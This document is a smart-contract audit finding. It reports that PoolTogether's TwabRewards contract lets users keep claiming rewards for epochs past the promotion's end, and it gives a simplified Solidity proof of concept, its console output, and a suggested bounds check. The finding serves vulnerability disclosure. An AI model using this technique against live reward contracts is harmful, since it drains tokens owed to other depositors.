## Tags

- bug
- 3 (High Risk)
- sponsor confirmed

# [Continue claiming reqrds after numberOfEpochs are over](https://github.com/code-423n4/2021-12-pooltogether-findings/issues/20) 

# Handle

gpersoon


# Vulnerability details

## Impact
When claiming rewards via claimRewards(), the function _calculateRewardAmount() is called.
The function _calculateRewardAmount() has a check to make sure the epoch is over 
```JS
  require(block.timestamp > _epochEndTimestamp, "TwabRewards/epoch-not-over"); 
```
However neither functions check if the _epochId is within the range of the reward epochs.
Ergo it is possible to continue claiming rewards after the reward period is over.
This only works as long as there are enough tokens in the contract. But this is the case when not everyone has claimed, or other rewards use the same token.

The proof of concept contains a simplified version of the contract, and shows how this can be done.
When run in remix you get the following output, while there is only 1 epoch.
console.log:
 Claiming for epoch 1 1
 Claiming for epoch 2 1
 Claiming for epoch 3 1
 Claiming for epoch 4 1
 Claiming for epoch 5 1

## Proof of Concept
```JS
 // SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.6;
import "hardhat/console.sol";  

contract TwabRewards {

    struct Promotion {
        uint216 tokensPerEpoch;
        uint32 startTimestamp;
        uint32 epochDuration;
        uint8 numberOfEpochs;
    }
    mapping(uint256 => Promotion) internal _promotions;
    uint256 internal _latestPromotionId;
    mapping(uint256 => mapping(address => uint256)) internal _claimedEpochs;
    
    constructor() {
        uint id=createPromotion(1,uint32(block.timestamp)-10,1,1);
        claimRewards(id,1);
        claimRewards(id,2);
        claimRewards(id,3);
        claimRewards(id,4);
        claimRewards(id,5);
    }
     
    function createPromotion(uint216 _tokensPerEpoch,uint32 _startTimestamp,uint32 _epochDuration,uint8 _numberOfEpochs) public  returns (uint256) {
        uint256 _nextPromotionId = _latestPromotionId + 1;
        _latestPromotionId = _nextPromotionId;
        _promotions[_nextPromotionId] = Promotion(_tokensPerEpoch,_startTimestamp,_epochDuration,_numberOfEpochs);
        return _nextPromotionId;
    }
 
    function claimRewards(
        uint256 _promotionId,
        uint256 _epochId
    ) public  returns (uint256) {
        Promotion memory _promotion = _getPromotion(_promotionId);
        address _user=address(0);
        uint256 _rewardsAmount;
        uint256 _userClaimedEpochs = _claimedEpochs[_promotionId][_user];

        for (uint256 index = 0; index < 1; index++) {
            require(
                !_isClaimedEpoch(_userClaimedEpochs, _epochId),
                "TwabRewards/rewards-already-claimed"
            );
            _rewardsAmount += _calculateRewardAmount(_promotion, _epochId);
            _userClaimedEpochs = _updateClaimedEpoch(_userClaimedEpochs, _epochId);
        }
        _claimedEpochs[_promotionId][_user] = _userClaimedEpochs;
        console.log("Claiming for epoch",_epochId,_rewardsAmount);
        return _rewardsAmount;
    }

    function getPromotion(uint256 _promotionId) public view  returns (Promotion memory) {
        return _getPromotion(_promotionId);
    }
  function _getPromotion(uint256 _promotionId) internal view returns (Promotion memory) {
        return _promotions[_promotionId];
    }
    
    function _isClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (bool)
    {
        return (_userClaimedEpochs >> _epochId) & uint256(1) == 1;
    }

 function _calculateRewardAmount(        
        Promotion memory _promotion,
        uint256 _epochId
    ) internal view returns (uint256) {
        uint256 _epochDuration = _promotion.epochDuration;
        uint256 _epochStartTimestamp = _promotion.startTimestamp + (_epochDuration * _epochId);
        uint256 _epochEndTimestamp = _epochStartTimestamp + _epochDuration;
        require(block.timestamp > _epochEndTimestamp, "TwabRewards/epoch-not-over");
        return 1;
    }

 function _updateClaimedEpoch(uint256 _userClaimedEpochs, uint256 _epochId) internal pure returns (uint256) {
        return _userClaimedEpochs | (uint256(1) << _epochId);
    }
  
    function _getCurrentEpochId(Promotion memory _promotion) internal view returns (uint256) {        
        return (block.timestamp - _promotion.startTimestamp) / _promotion.epochDuration;
    }
 
    function _getRemainingRewards(Promotion memory _promotion) internal view returns (uint256) {
        // _tokensPerEpoch * _numberOfEpochsLeft
        return
            _promotion.tokensPerEpoch *
            (_promotion.numberOfEpochs - _getCurrentEpochId(_promotion));
    }
 
}
```

## Tools Used

## Recommended Mitigation Steps
In the function _calculateRewardAmount() add something like the following in the beginning after the require.
if ( _epochId >= _promotion.numberOfEpochs) return 0;


